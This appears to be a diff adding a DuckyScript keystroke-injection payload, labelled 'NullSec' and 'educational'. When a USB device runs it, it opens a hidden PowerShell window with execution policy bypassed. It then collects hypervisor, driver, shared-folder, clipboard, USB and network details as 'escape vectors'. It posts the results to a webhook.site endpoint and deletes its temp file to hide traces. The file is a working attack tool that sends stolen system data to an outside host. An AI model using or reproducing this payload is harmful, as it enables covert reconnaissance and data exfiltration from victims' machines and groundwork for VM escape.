@@ -1,0 +1,103 @@
+REM NullSec - Hypervisor Detection & VM Escape Prep
+REM Detects virtualization and collects escape-relevant info
+REM Educational/research purposes only
+
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 1000
+
+REM Detect hypervisor type
+STRING $vmInfo = @{}
+ENTER
+
+REM Check CPUID for hypervisor
+STRING $vmInfo.HypervisorPresent = (Get-WmiObject Win32_ComputerSystem).HypervisorPresent
+ENTER
+
+REM Detect specific hypervisor
+STRING $manufacturer = (Get-WmiObject Win32_ComputerSystem).Manufacturer
+ENTER
+STRING $model = (Get-WmiObject Win32_ComputerSystem).Model
+ENTER
+STRING $bios = (Get-WmiObject Win32_BIOS).Manufacturer
+ENTER
+
+STRING $vmType = switch -Wildcard ($manufacturer + $model + $bios) {
+    '*VMware*' { 'VMware' }
+    '*VirtualBox*' { 'VirtualBox' }
+    '*Hyper-V*' { 'Hyper-V' }
+    '*QEMU*' { 'QEMU/KVM' }
+    '*Xen*' { 'Xen' }
+    '*Parallels*' { 'Parallels' }
+    '*Microsoft*Virtual*' { 'Hyper-V' }
+    default { 'Physical/Unknown' }
+}
+ENTER
+
+STRING $vmInfo.DetectedType = $vmType
+ENTER
+STRING $vmInfo.Manufacturer = $manufacturer
+ENTER
+STRING $vmInfo.Model = $model
+ENTER
+DELAY 200
+
+REM Check for VM tools/drivers
+STRING $vmDrivers = Get-WmiObject Win32_SystemDriver | Where-Object {$_.DisplayName -match 'vmware|vbox|hyper|xen|virtio'}
+ENTER
+STRING $vmInfo.VMDrivers = $vmDrivers | Select DisplayName, State | ConvertTo-Json
+ENTER
+DELAY 200
+
+REM Check shared folders (escape vector)
+STRING $vmInfo.SharedFolders = @()
+ENTER
+STRING if ($vmType -eq 'VMware') { $vmInfo.SharedFolders = Get-ChildItem '\\vmware-host\Shared Folders' -ErrorAction SilentlyContinue }
+ENTER
+STRING if ($vmType -eq 'VirtualBox') { $vmInfo.SharedFolders = net use 2>$null | Where-Object {$_ -match 'VirtualBox'} }
+ENTER
+DELAY 200
+
+REM Check clipboard integration (attack vector)
+STRING $vmInfo.ClipboardEnabled = $null -ne (Get-Process | Where-Object {$_.Name -match 'vmtoolsd|VBoxTray'})
+ENTER
+
+REM Guest additions version
+STRING $vmInfo.GuestAdditions = (Get-ItemProperty 'HKLM:\SOFTWARE\VMware, Inc.\VMware Tools' -ErrorAction SilentlyContinue).InstallPath
+ENTER
+STRING $vmInfo.VBoxAdditions = (Get-ItemProperty 'HKLM:\SOFTWARE\Oracle\VirtualBox Guest Additions' -ErrorAction SilentlyContinue).InstallDir
+ENTER
+DELAY 200
+
+REM Check for escape-relevant vulnerabilities
+STRING $vmInfo.EscapeVectors = @{
+    SharedFoldersWritable = $vmInfo.SharedFolders.Count -gt 0
+    ClipboardBidirectional = $vmInfo.ClipboardEnabled
+    DragDropEnabled = $true
+    USBPassthrough = (Get-PnpDevice | Where-Object {$_.Class -eq 'USB'}).Count -gt 0
+}
+ENTER
+DELAY 200
+
+REM Network info (host network access)
+STRING $vmInfo.Network = @{
+    Adapters = Get-NetAdapter | Select Name, InterfaceDescription, MacAddress | ConvertTo-Json
+    HostOnlyNets = Get-NetIPAddress | Where-Object {$_.IPAddress -match '^192\.168\.(56|122)\.'} | Select IPAddress
+}
+ENTER
+DELAY 200
+
+REM Export findings
+STRING $vmInfo | ConvertTo-Json -Depth 5 | Out-File "$env:TEMP\vm_analysis.json"
+ENTER
+DELAY 200
+
+REM Send to webhook
+STRING try { Invoke-RestMethod -Uri "https://webhook.site/YOUR-ID" -Method Post -Body ($vmInfo | ConvertTo-Json -Depth 5) -ContentType "application/json" } catch {}
+ENTER
+DELAY 500
+
+STRING Remove-Item "$env:TEMP\vm_analysis.json" -Force 2>$null; exit
+ENTER
